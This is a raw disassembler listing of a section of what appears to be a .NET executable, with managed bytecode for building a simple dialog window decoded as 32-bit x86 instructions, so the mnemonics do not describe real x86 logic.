  402578:	0a 06                	or     (%esi),%al
  40257a:	09 6f 4d             	or     %ebp,0x4d(%edi)
  40257d:	00 00                	add    %al,(%eax)
  40257f:	0a 06                	or     (%esi),%al
  402581:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402584:	4e                   	dec    %esi
  402585:	00 00                	add    %al,(%eax)
  402587:	0a 06                	or     (%esi),%al
  402589:	6f                   	outsl  %ds:(%esi),(%dx)
  40258a:	4f                   	dec    %edi
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 13                	or     (%ebx),%dl
  40258f:	07                   	pop    %es
  402590:	04 08                	add    $0x8,%al
  402592:	6f                   	outsl  %ds:(%esi),(%dx)
  402593:	50                   	push   %eax
  402594:	00 00                	add    %al,(%eax)
  402596:	0a 51 11             	or     0x11(%ecx),%dl
  402599:	07                   	pop    %es
  40259a:	2a 00                	sub    (%eax),%al
  40259c:	01 10                	add    %edx,(%eax)
  40259e:	00 00                	add    %al,(%eax)
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	ed                   	in     (%dx),%eax
  4025a3:	01 17                	add    %edx,(%edi)
  4025a5:	04 02                	add    $0x2,%al
  4025a7:	03 01                	add    (%ecx),%eax
  4025a9:	00 00                	add    %al,(%eax)
  4025ab:	01 2a                	add    %ebp,(%edx)
  4025ad:	02 03                	add    (%ebx),%al
  4025af:	04 16                	add    $0x16,%al
  4025b1:	28 20                	sub    %ah,(%eax)
  4025b3:	00 00                	add    %al,(%eax)
  4025b5:	06                   	push   %es
  4025b6:	2a 1e                	sub    (%esi),%bl
  4025b8:	02 28                	add    (%eax),%ch
  4025ba:	11 00                	adc    %eax,(%eax)
  4025bc:	00 0a                	add    %cl,(%edx)
  4025be:	2a 00                	sub    (%eax),%al
  4025c0:	1b 30                	sbb    (%eax),%esi
  4025c2:	05 00 ed 02 00       	add    $0x2ed00,%eax
  4025c7:	00 06                	add    %al,(%esi)
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	11 02                	adc    %eax,(%edx)
  4025cd:	2d 02 15 2a 02       	sub    $0x22a1502,%eax
  4025d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4025d3:	51                   	push   %ecx
  4025d4:	00 00                	add    %al,(%eax)
  4025d6:	0a 17                	or     (%edi),%dl
  4025d8:	2f                   	das
  4025d9:	02 15 2a 73 18 00    	add    0x18732a,%dl
  4025df:	00 0a                	add    %cl,(%edx)
  4025e1:	0a 06                	or     (%esi),%al
  4025e3:	22 00                	and    (%eax),%al
  4025e5:	00 c0                	add    %al,%al
  4025e7:	40                   	inc    %eax
  4025e8:	22 00                	and    (%eax),%al
  4025ea:	00 50 41             	add    %dl,0x41(%eax)
  4025ed:	73 2b                	jae    0x40261a
  4025ef:	00 00                	add    %al,(%eax)
  4025f1:	0a 6f 2c             	or     0x2c(%edi),%ch
  4025f4:	00 00                	add    %al,(%eax)
  4025f6:	0a 06                	or     (%esi),%al
  4025f8:	17                   	pop    %ss
  4025f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4025fa:	2d 00 00 0a 02       	sub    $0x20a0000,%eax
  4025ff:	6f                   	outsl  %ds:(%esi),(%dx)
  402600:	51                   	push   %ecx
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 8d 4c 00 00 01    	or     0x100004c(%ebp),%cl
  402609:	0b 73 52             	or     0x52(%ebx),%esi
  40260c:	00 00                	add    %al,(%eax)
  40260e:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  402611:	30 00                	xor    %al,(%eax)
  402613:	00 0a                	add    %cl,(%edx)
  402615:	0d 1f 13 13 04       	or     $0x413131f,%eax
  40261a:	16                   	push   %ss
  40261b:	13 05 05 28 0d 00    	adc    0xd2805,%eax
  402621:	00 0a                	add    %cl,(%edx)
  402623:	2d 6e 73 2e 00       	sub    $0x2e736e,%eax
  402628:	00 0a                	add    %cl,(%edx)
  40262a:	13 06                	adc    (%esi),%eax
  40262c:	11 06                	adc    %eax,(%esi)
  40262e:	05 6f 31 00 00       	add    $0x316f,%eax
  402633:	0a 11                	or     (%ecx),%dl
  402635:	06                   	push   %es
  402636:	1f                   	pop    %ds
  402637:	09 1f                	or     %ebx,(%edi)
  402639:	13 73 32             	adc    0x32(%ebx),%esi
  40263c:	00 00                	add    %al,(%eax)
  40263e:	0a 6f 33             	or     0x33(%edi),%ch
  402641:	00 00                	add    %al,(%eax)
  402643:	0a 11                	or     (%ecx),%dl
  402645:	06                   	push   %es
  402646:	06                   	push   %es
  402647:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40264a:	00 0a                	add    %cl,(%edx)
  40264c:	6f                   	outsl  %ds:(%esi),(%dx)
  40264d:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  402652:	0c 12                	or     $0x12,%al
  402654:	0c 28                	or     $0x28,%al
  402656:	36 00 00             	add    %al,%ss:(%eax)
  402659:	0a 1b                	or     (%ebx),%bl
  40265b:	5a                   	pop    %edx
  40265c:	1e                   	push   %ds
  40265d:	5b                   	pop    %ebx
  40265e:	1f                   	pop    %ds
  40265f:	12 59 16             	adc    0x16(%ecx),%bl
  402662:	73 37                	jae    0x40269b
  402664:	00 00                	add    %al,(%eax)
  402666:	0a 6f 38             	or     0x38(%edi),%ch
  402669:	00 00                	add    %al,(%eax)
  40266b:	0a 11                	or     (%ecx),%dl
  40266d:	06                   	push   %es
  40266e:	17                   	pop    %ss
  40266f:	6f                   	outsl  %ds:(%esi),(%dx)
  402670:	39 00                	cmp    %eax,(%eax)
  402672:	00 0a                	add    %cl,(%edx)
  402674:	06                   	push   %es
  402675:	6f                   	outsl  %ds:(%esi),(%dx)
  402676:	3a 00                	cmp    (%eax),%al
  402678:	00 0a                	add    %cl,(%edx)
  40267a:	11 06                	adc    %eax,(%esi)
  40267c:	6f                   	outsl  %ds:(%esi),(%dx)
  40267d:	3b 00                	cmp    (%eax),%eax
  40267f:	00 0a                	add    %cl,(%edx)
  402681:	11 06                	adc    %eax,(%esi)
  402683:	6f                   	outsl  %ds:(%esi),(%dx)
  402684:	3d 00 00 0a 13       	cmp    $0x130a0000,%eax
  402689:	04 11                	add    $0x11,%al
  40268b:	06                   	push   %es
  40268c:	6f                   	outsl  %ds:(%esi),(%dx)
  40268d:	3e 00 00             	add    %al,%ds:(%eax)
  402690:	0a 13                	or     (%ebx),%dl
  402692:	05 16 13 07 06       	add    $0x6071316,%eax
  402697:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40269a:	00 0a                	add    %cl,(%edx)
  40269c:	6f                   	outsl  %ds:(%esi),(%dx)
  40269d:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4026a2:	0d 12 0d 28 36       	or     $0x36280d12,%eax
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	0a 1b                	or     (%ebx),%bl
  4026ab:	5a                   	pop    %edx
  4026ac:	1e                   	push   %ds
  4026ad:	5b                   	pop    %ebx
  4026ae:	1f                   	pop    %ds
  4026af:	12 59 13             	adc    0x13(%ecx),%bl
  4026b2:	08 02                	or     %al,(%edx)
  4026b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4026b5:	53                   	push   %ebx
  4026b6:	00 00                	add    %al,(%eax)
  4026b8:	0a 13                	or     (%ebx),%dl
  4026ba:	0e                   	push   %cs
  4026bb:	38 ed                	cmp    %ch,%ch
  4026bd:	00 00                	add    %al,(%eax)
  4026bf:	00 11                	add    %dl,(%ecx)
  4026c1:	0e                   	push   %cs
  4026c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4026c3:	54                   	push   %esp
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	0a 13                	or     (%ebx),%dl
  4026c8:	09 07                	or     %eax,(%edi)
  4026ca:	11 07                	adc    %eax,(%edi)
  4026cc:	73 55                	jae    0x402723
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	0a a2 07 11 07 9a    	or     -0x65f8eef9(%edx),%ah
  4026d6:	11 09                	adc    %ecx,(%ecx)
  4026d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d9:	56                   	push   %esi
  4026da:	00 00                	add    %al,(%eax)
  4026dc:	0a 6f 31             	or     0x31(%edi),%ch
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	0a 11                	or     (%ecx),%dl
  4026e3:	07                   	pop    %es
  4026e4:	03 33                	add    (%ebx),%esi
  4026e6:	0a 07                	or     (%edi),%al
  4026e8:	11 07                	adc    %eax,(%edi)
  4026ea:	9a 17 6f 57 00 00 0a 	lcall  $0xa00,$0x576f17
  4026f1:	07                   	pop    %es
  4026f2:	11 07                	adc    %eax,(%edi)
  4026f4:	9a 1f 09 11 04 73 32 	lcall  $0x3273,$0x411091f
  4026fb:	00 00                	add    %al,(%eax)
  4026fd:	0a 6f 33             	or     0x33(%edi),%ch
  402700:	00 00                	add    %al,(%eax)
  402702:	0a 07                	or     (%edi),%al
  402704:	11 07                	adc    %eax,(%edi)
  402706:	9a 17 6f 39 00 00 0a 	lcall  $0xa00,$0x396f17
  40270d:	06                   	push   %es
  40270e:	6f                   	outsl  %ds:(%esi),(%dx)
  40270f:	3a 00                	cmp    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	07                   	pop    %es
  402714:	11 07                	adc    %eax,(%edi)
  402716:	9a 6f 3b 00 00 0a 07 	lcall  $0x70a,$0x3b6f
  40271d:	11 07                	adc    %eax,(%edi)
  40271f:	9a 6f 58 00 00 0a 11 	lcall  $0x110a,$0x586f
  402726:	08 31                	or     %dh,(%ecx)
  402728:	3c 07                	cmp    $0x7,%al
  40272a:	11 07                	adc    %eax,(%edi)
  40272c:	9a 6f 59 00 00 0a 13 	lcall  $0x130a,$0x596f
  402733:	0a 07                	or     (%edi),%al
  402735:	11 07                	adc    %eax,(%edi)
  402737:	9a 11 0a 17 07 11 07 	lcall  $0x711,$0x7170a11
  40273e:	9a 6f 58 00 00 0a 17 	lcall  $0x170a,$0x586f
  402745:	59                   	pop    %ecx
  402746:	11 08                	adc    %ecx,(%eax)
  402748:	5b                   	pop    %ebx
  402749:	58                   	pop    %eax
  40274a:	5a                   	pop    %edx
  40274b:	6f                   	outsl  %ds:(%esi),(%dx)
  40274c:	5a                   	pop    %edx
  40274d:	00 00                	add    %al,(%eax)
  40274f:	0a 07                	or     (%edi),%al
  402751:	11 07                	adc    %eax,(%edi)
  402753:	9a 11 08 6f 5b 00 00 	lcall  $0x0,$0x5b6f0811
  40275a:	0a 07                	or     (%edi),%al
  40275c:	11 07                	adc    %eax,(%edi)
  40275e:	9a 16 6f 39 00 00 0a 	lcall  $0xa00,$0x396f16
  402765:	07                   	pop    %es
  402766:	11 07                	adc    %eax,(%edi)
  402768:	9a 6f 3d 00 00 0a 13 	lcall  $0x130a,$0x3d6f
  40276f:	04 07                	add    $0x7,%al
  402771:	11 07                	adc    %eax,(%edi)
  402773:	9a 6f 3e 00 00 0a 11 	lcall  $0x110a,$0x3e6f
  40277a:	05 31 0b 07 11       	add    $0x11070b31,%eax
  40277f:	07                   	pop    %es
  402780:	9a 6f 3e 00 00 0a 13 	lcall  $0x130a,$0x3e6f
  402787:	05 11 09 6f 5c       	add    $0x5c6f0911,%eax
  40278c:	00 00                	add    %al,(%eax)
  40278e:	0a 28                	or     (%eax),%ch
  402790:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  402795:	11 08                	adc    %ecx,(%eax)
  402797:	07                   	pop    %es
  402798:	11 07                	adc    %eax,(%edi)
  40279a:	9a 11 09 6f 5c 00 00 	lcall  $0x0,$0x5c6f0911
  4027a1:	0a 6f 5d             	or     0x5d(%edi),%ch
  4027a4:	00 00                	add    %al,(%eax)
  4027a6:	0a 11                	or     (%ecx),%dl
  4027a8:	07                   	pop    %es
  4027a9:	17                   	pop    %ss
  4027aa:	58                   	pop    %eax
  4027ab:	13 07                	adc    (%edi),%eax
  4027ad:	11 0e                	adc    %ecx,(%esi)
  4027af:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b0:	5e                   	pop    %esi
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	0a 3a                	or     (%edx),%bh
  4027b5:	07                   	pop    %es
  4027b6:	ff                   	(bad)
  4027b7:	ff                   	(bad)
  4027b8:	ff                   	lcall  (bad)
  4027b9:	de 0c 11             	fimuls (%ecx,%edx,1)
  4027bc:	0e                   	push   %cs
  4027bd:	2c 07                	sub    $0x7,%al
  4027bf:	11 0e                	adc    %ecx,(%esi)
  4027c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c2:	5f                   	pop    %edi
  4027c3:	00 00                	add    %al,(%eax)
  4027c5:	0a dc                	or     %ah,%bl
  4027c7:	08 17                	or     %dl,(%edi)
  4027c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ca:	60                   	pusha
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	0a 09                	or     (%ecx),%cl
  4027cf:	72 47                	jb     0x402818
  4027d1:	00 00                	add    %al,(%eax)
  4027d3:	70 6f                	jo     0x402844
  4027d5:	31 00                	xor    %eax,(%eax)
  4027d7:	00 0a                	add    %cl,(%edx)
  4027d9:	09 17                	or     %edx,(%edi)
  4027db:	6f                   	outsl  %ds:(%esi),(%dx)
  4027dc:	41                   	inc    %ecx
  4027dd:	00 00                	add    %al,(%eax)
  4027df:	0a 09                	or     (%ecx),%cl
  4027e1:	1f                   	pop    %ds
  4027e2:	0c 11                	or     $0x11,%al
  4027e4:	05 1f 4d 59 28       	add    $0x28594d1f,%eax
  4027e9:	42                   	inc    %edx
  4027ea:	00 00                	add    %al,(%eax)
  4027ec:	0a 11                	or     (%ecx),%dl
  4027ee:	04 1f                	add    $0x1f,%al
  4027f0:	24 58                	and    $0x58,%al
  4027f2:	1f                   	pop    %ds
  4027f3:	4b                   	dec    %ebx
  4027f4:	1f                   	pop    %ds
  4027f5:	17                   	pop    %ss
  4027f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4027f7:	3f                   	aas
  4027f8:	00 00                	add    %al,(%eax)
  4027fa:	0a 04 28             	or     (%eax,%ebp,1),%al
  4027fd:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  402802:	12 06                	adc    (%esi),%al
  402804:	28 28                	sub    %ch,(%eax)
  402806:	00 00                	add    %al,(%eax)
  402808:	0a 6f 29             	or     0x29(%edi),%ch
  40280b:	00 00                	add    %al,(%eax)
  40280d:	0a 6f 31             	or     0x31(%edi),%ch
  402810:	00 00                	add    %al,(%eax)
  402812:	0a 2b                	or     (%ebx),%ch
  402814:	07                   	pop    %es
  402815:	06                   	push   %es
  402816:	04 6f                	add    $0x6f,%al
  402818:	31 00                	xor    %eax,(%eax)
  40281a:	00 0a                	add    %cl,(%edx)
  40281c:	06                   	push   %es
  40281d:	20 b2 00 00 00 11    	and    %dh,0x11000000(%edx)
  402823:	05 1f 0a 58 28       	add    $0x28580a1f,%eax
  402828:	42                   	inc    %edx
  402829:	00 00                	add    %al,(%eax)
  40282b:	0a 11                	or     (%ecx),%dl
  40282d:	04 1f                	add    $0x1f,%al
  40282f:	47                   	inc    %edi
  402830:	58                   	pop    %eax
  402831:	73 37                	jae    0x40286a
  402833:	00 00                	add    %al,(%eax)
  402835:	0a 6f 43             	or     0x43(%edi),%ch
  402838:	00 00                	add    %al,(%eax)
  40283a:	0a 06                	or     (%esi),%al
  40283c:	6f                   	outsl  %ds:(%esi),(%dx)
  40283d:	3a 00                	cmp    (%eax),%al
  40283f:	00 0a                	add    %cl,(%edx)
  402841:	09 6f 3b             	or     %ebp,0x3b(%edi)
  402844:	00 00                	add    %al,(%eax)
  402846:	0a 06                	or     (%esi),%al
  402848:	19 6f 45             	sbb    %ebp,0x45(%edi)
  40284b:	00 00                	add    %al,(%eax)
  40284d:	0a 06                	or     (%esi),%al
  40284f:	17                   	pop    %ss
  402850:	6f                   	outsl  %ds:(%esi),(%dx)
  402851:	46                   	inc    %esi
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 06                	or     (%esi),%al
  402856:	28 47 00             	sub    %al,0x0(%edi)
  402859:	00 0a                	add    %cl,(%edx)
  40285b:	6f                   	outsl  %ds:(%esi),(%dx)
  40285c:	48                   	dec    %eax
  40285d:	00 00                	add    %al,(%eax)
  40285f:	0a 28                	or     (%eax),%ch
  402861:	49                   	dec    %ecx
  402862:	00 00                	add    %al,(%eax)
  402864:	0a 6f 4a             	or     0x4a(%edi),%ch
  402867:	00 00                	add    %al,(%eax)
  402869:	0a de                	or     %dh,%bl
  40286b:	03 26                	add    (%esi),%esp
  40286d:	de 00                	fiadds (%eax)
  40286f:	06                   	push   %es
  402870:	16                   	push   %ss
  402871:	6f                   	outsl  %ds:(%esi),(%dx)
  402872:	4b                   	dec    %ebx
  402873:	00 00                	add    %al,(%eax)
  402875:	0a 06                	or     (%esi),%al
  402877:	16                   	push   %ss
  402878:	6f                   	outsl  %ds:(%esi),(%dx)
  402879:	4c                   	dec    %esp
  40287a:	00 00                	add    %al,(%eax)
  40287c:	0a 06                	or     (%esi),%al
  40287e:	09 6f 4d             	or     %ebp,0x4d(%edi)
  402881:	00 00                	add    %al,(%eax)
  402883:	0a 06                	or     (%esi),%al
  402885:	6f                   	outsl  %ds:(%esi),(%dx)
  402886:	4f                   	dec    %edi
  402887:	00 00                	add    %al,(%eax)
  402889:	0a 17                	or     (%edi),%dl
  40288b:	33 2a                	xor    (%edx),%ebp
  40288d:	15 13 0b 16 13       	adc    $0x13160b13,%eax
  402892:	07                   	pop    %es
  402893:	2b 15 07 11 07 9a    	sub    0x9a071107,%edx
  402899:	6f                   	outsl  %ds:(%esi),(%dx)
  40289a:	61                   	popa
  40289b:	00 00                	add    %al,(%eax)
  40289d:	0a 2c 04             	or     (%esp,%eax,1),%ch
  4028a0:	11 07                	adc    %eax,(%edi)
  4028a2:	13 0b                	adc    (%ebx),%ecx
  4028a4:	11 07                	adc    %eax,(%edi)
  4028a6:	17                   	pop    %ss
  4028a7:	58                   	pop    %eax
  4028a8:	13 07                	adc    (%edi),%eax
  4028aa:	11 07                	adc    %eax,(%edi)
  4028ac:	02 6f 51             	add    0x51(%edi),%ch
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	0a 32                	or     (%edx),%dh
  4028b3:	e1 11                	loope  0x4028c6
  4028b5:	0b 2a                	or     (%edx),%ebp
  4028b7:	15 2a 00 00 00       	adc    $0x2a,%eax
  4028bc:	41                   	inc    %ecx
  4028bd:	34 00                	xor    $0x0,%al
  4028bf:	00 02                	add    %al,(%edx)
  4028c1:	00 00                	add    %al,(%eax)
  4028c3:	00 ef                	add    %ch,%bh
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	01 00                	add    %eax,(%eax)
  4028cb:	00 ef                	add    %ch,%bh
  4028cd:	01 00                	add    %eax,(%eax)
  4028cf:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4028da:	00 00                	add    %al,(%eax)
  4028dc:	89 02                	mov    %eax,(%edx)
  4028de:	00 00                	add    %al,(%eax)
  4028e0:	17                   	pop    %ss
  4028e1:	00 00                	add    %al,(%eax)
  4028e3:	00 a0 02 00 00 03    	add    %ah,0x3000002(%eax)
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 01                	add    %al,(%ecx)
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	01 1e                	add    %ebx,(%esi)
  4028f1:	02 28                	add    (%eax),%ch
  4028f3:	11 00                	adc    %eax,(%eax)
  4028f5:	00 0a                	add    %cl,(%edx)
  4028f7:	2a 13                	sub    (%ebx),%dl
  4028f9:	30 06                	xor    %al,(%esi)
  4028fb:	00 50 00             	add    %dl,0x0(%eax)
  4028fe:	00 00                	add    %al,(%eax)
  402900:	07                   	pop    %es
  402901:	00 00                	add    %al,(%eax)
  402903:	11 1f                	adc    %ebx,(%edi)
  402905:	40                   	inc    %eax
  402906:	73 62                	jae    0x40296a
  402908:	00 00                	add    %al,(%eax)
  40290a:	0a 0a                	or     (%edx),%cl
  40290c:	20 00                	and    %al,(%eax)
  40290e:	01 00                	add    %eax,(%eax)
  402910:	00 8d 51 00 00 01    	add    %cl,0x1000051(%ebp)
  402916:	0b 03                	or     (%ebx),%eax
  402918:	2c 09                	sub    $0x9,%al
  40291a:	07                   	pop    %es
  40291b:	1f                   	pop    %ds
  40291c:	10 20                	adc    %ah,(%eax)
  40291e:	ff 00                	incl   (%eax)
  402920:	00 00                	add    %al,(%eax)
  402922:	9c                   	pushf
  402923:	04 2c                	add    $0x2c,%al
  402925:	12 07                	adc    (%edi),%al
  402927:	1f                   	pop    %ds
  402928:	11 20                	adc    %esp,(%eax)
  40292a:	ff 00                	incl   (%eax)
  40292c:	00 00                	add    %al,(%eax)
  40292e:	9c                   	pushf
  40292f:	07                   	pop    %es
  402930:	1f                   	pop    %ds
  402931:	12 20                	adc    (%eax),%ah
  402933:	ff 00                	incl   (%eax)
  402935:	00 00                	add    %al,(%eax)
  402937:	9c                   	pushf
  402938:	02 16                	add    (%esi),%dl
  40293a:	07                   	pop    %es
  40293b:	06                   	push   %es
  40293c:	1f                   	pop    %ds
  40293d:	40                   	inc    %eax
  40293e:	16                   	push   %ss
  40293f:	28 25 00 00 06 17    	sub    %ah,0x17060000
  402945:	32 07                	xor    (%edi),%al
  402947:	06                   	push   %es
  402948:	6f                   	outsl  %ds:(%esi),(%dx)
  402949:	10 00                	adc    %al,(%eax)
  40294b:	00 0a                	add    %cl,(%edx)
  40294d:	2a 72 5b             	sub    0x5b(%edx),%dh
  402950:	00 00                	add    %al,(%eax)
  402952:	70 2a                	jo     0x40297e
  402954:	1b 30                	sbb    (%eax),%esi
  402956:	04 00                	add    $0x0,%al
  402958:	e9 00 00 00 08       	jmp    0x840295d
  40295d:	00 00                	add    %al,(%eax)
  40295f:	11 73 29             	adc    %esi,0x29(%ebx)
  402962:	00 00                	add    %al,(%eax)
  402964:	06                   	push   %es
  402965:	0a 73 2e             	or     0x2e(%ebx),%dh
  402968:	00 00                	add    %al,(%eax)
  40296a:	0a 0b                	or     (%ebx),%cl
  40296c:	03 28                	add    (%eax),%ebp
  40296e:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  402973:	0d 07 72 5f 00       	or     $0x5f7207,%eax
  402978:	00 70 6f             	add    %dh,0x6f(%eax)
  40297b:	31 00                	xor    %eax,(%eax)
  40297d:	00 0a                	add    %cl,(%edx)
  40297f:	2b 07                	sub    (%edi),%eax
  402981:	07                   	pop    %es
  402982:	03 6f 31             	add    0x31(%edi),%ebp
  402985:	00 00                	add    %al,(%eax)
  402987:	0a 07                	or     (%edi),%al
  402989:	1f                   	pop    %ds
  40298a:	09 1f                	or     %ebx,(%edi)
  40298c:	13 73 32             	adc    0x32(%ebx),%esi
  40298f:	00 00                	add    %al,(%eax)
  402991:	0a 6f 33             	or     0x33(%edi),%ch
  402994:	00 00                	add    %al,(%eax)
  402996:	0a 07                	or     (%edi),%al
  402998:	06                   	push   %es
  402999:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40299c:	00 0a                	add    %cl,(%edx)
  40299e:	6f                   	outsl  %ds:(%esi),(%dx)
  40299f:	35 00 00 0a 0c       	xor    $0xc0a0000,%eax
  4029a4:	12 02                	adc    (%edx),%al
  4029a6:	28 36                	sub    %dh,(%esi)
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	0a 1b                	or     (%ebx),%bl
  4029ac:	5a                   	pop    %edx
  4029ad:	1e                   	push   %ds
  4029ae:	5b                   	pop    %ebx
  4029af:	1f                   	pop    %ds
  4029b0:	12 59 16             	adc    0x16(%ecx),%bl
  4029b3:	73 37                	jae    0x4029ec
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	0a 6f 38             	or     0x38(%edi),%ch
  4029ba:	00 00                	add    %al,(%eax)
  4029bc:	0a 07                	or     (%edi),%al
  4029be:	17                   	pop    %ss
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	39 00                	cmp    %eax,(%eax)
  4029c2:	00 0a                	add    %cl,(%edx)
  4029c4:	06                   	push   %es
  4029c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c6:	3a 00                	cmp    (%eax),%al
  4029c8:	00 0a                	add    %cl,(%edx)
  4029ca:	07                   	pop    %es
  4029cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4029cc:	3b 00                	cmp    (%eax),%eax
  4029ce:	00 0a                	add    %cl,(%edx)
  4029d0:	06                   	push   %es
  4029d1:	02 6f 31             	add    0x31(%edi),%ch
  4029d4:	00 00                	add    %al,(%eax)
  4029d6:	0a 06                	or     (%esi),%al
  4029d8:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  4029de:	6f                   	outsl  %ds:(%esi),(%dx)
  4029df:	3e 00 00             	add    %al,%ds:(%eax)
  4029e2:	0a 1f                	or     (%edi),%bl
  4029e4:	0a 58 28             	or     0x28(%eax),%bl
  4029e7:	42                   	inc    %edx
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	0a 07                	or     (%edi),%al
  4029ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ed:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  4029f2:	37                   	aaa
  4029f3:	58                   	pop    %eax
  4029f4:	73 37                	jae    0x402a2d
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	0a 6f 43             	or     0x43(%edi),%ch
  4029fb:	00 00                	add    %al,(%eax)
  4029fd:	0a 06                	or     (%esi),%al
  4029ff:	19 6f 45             	sbb    %ebp,0x45(%edi)
  402a02:	00 00                	add    %al,(%eax)
  402a04:	0a 06                	or     (%esi),%al
  402a06:	17                   	pop    %ss
  402a07:	6f                   	outsl  %ds:(%esi),(%dx)
  402a08:	46                   	inc    %esi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	0a 06                	or     (%esi),%al
  402a0d:	28 47 00             	sub    %al,0x0(%edi)
  402a10:	00 0a                	add    %cl,(%edx)
  402a12:	6f                   	outsl  %ds:(%esi),(%dx)
  402a13:	48                   	dec    %eax
  402a14:	00 00                	add    %al,(%eax)
  402a16:	0a 28                	or     (%eax),%ch
  402a18:	49                   	dec    %ecx
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	0a 6f 4a             	or     0x4a(%edi),%ch
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	0a de                	or     %dh,%bl
  402a22:	03 26                	add    (%esi),%esp
  402a24:	de 00                	fiadds (%eax)
  402a26:	06                   	push   %es
  402a27:	16                   	push   %ss
  402a28:	6f                   	outsl  %ds:(%esi),(%dx)
  402a29:	4b                   	dec    %ebx
  402a2a:	00 00                	add    %al,(%eax)
  402a2c:	0a 06                	or     (%esi),%al
  402a2e:	16                   	push   %ss
  402a2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402a30:	4c                   	dec    %esp
  402a31:	00 00                	add    %al,(%eax)
  402a33:	0a 06                	or     (%esi),%al
  402a35:	04 7d                	add    $0x7d,%al
  402a37:	28 00                	sub    %al,(%eax)
  402a39:	00 04 06             	add    %al,(%esi,%eax,1)
  402a3c:	6f                   	outsl  %ds:(%esi),(%dx)
  402a3d:	4f                   	dec    %edi
  402a3e:	00 00                	add    %al,(%eax)
  402a40:	0a 26                	or     (%esi),%ah
  402a42:	06                   	push   %es
  402a43:	7b 29                	jnp    0x402a6e
  402a45:	00 00                	add    %al,(%eax)
  402a47:	04 2a                	add    $0x2a,%al
  402a49:	00 00                	add    %al,(%eax)
  402a4b:	00 01                	add    %al,(%ecx)
  402a4d:	10 00                	adc    %al,(%eax)
  402a4f:	00 00                	add    %al,(%eax)
  402a51:	00 ac 00 17 c3 00 03 	add    %ch,0x300c317(%eax,%eax,1)
  402a58:	01 00                	add    %eax,(%eax)
  402a5a:	00 01                	add    %al,(%ecx)
  402a5c:	1e                   	push   %ds
  402a5d:	02 28                	add    (%eax),%ch
  402a5f:	11 00                	adc    %eax,(%eax)
  402a61:	00 0a                	add    %cl,(%edx)
  402a63:	2a 03                	sub    (%ebx),%al
  402a65:	30 03                	xor    %al,(%ebx)
  402a67:	00 4e 00             	add    %cl,0x0(%esi)
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	00 00                	add    %al,(%eax)
  402a6e:	00 00                	add    %al,(%eax)
  402a70:	02 17                	add    (%edi),%dl
  402a72:	7d 28                	jge    0x402a9c
  402a74:	00 00                	add    %al,(%eax)
  402a76:	04 02                	add    $0x2,%al
  402a78:	28 18                	sub    %bl,(%eax)
  402a7a:	00 00                	add    %al,(%eax)
  402a7c:	0a 02                	or     (%edx),%al
  402a7e:	22 00                	and    (%eax),%al
  402a80:	00 c0                	add    %al,%al
  402a82:	40                   	inc    %eax
  402a83:	22 00                	and    (%eax),%al
  402a85:	00 50 41             	add    %dl,0x41(%eax)
  402a88:	73 2b                	jae    0x402ab5
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	0a 28                	or     (%eax),%ch
  402a8e:	2c 00                	sub    $0x0,%al
  402a90:	00 0a                	add    %cl,(%edx)
  402a92:	02 17                	add    (%edi),%dl
  402a94:	28 2d 00 00 0a 02    	sub    %ch,0x20a0000
  402a9a:	02 fe                	add    %dh,%bh
  402a9c:	06                   	push   %es
  402a9d:	2a 00                	sub    (%eax),%al
  402a9f:	00 06                	add    %al,(%esi)
  402aa1:	73 63                	jae    0x402b06
  402aa3:	00 00                	add    %al,(%eax)
  402aa5:	0a 28                	or     (%eax),%ch
  402aa7:	64 00 00             	add    %al,%fs:(%eax)
  402aaa:	0a 02                	or     (%edx),%al
  402aac:	02 fe                	add    %dh,%bh
  402aae:	06                   	push   %es
  402aaf:	2b 00                	sub    (%eax),%eax
  402ab1:	00 06                	add    %al,(%esi)
  402ab3:	73 63                	jae    0x402b18
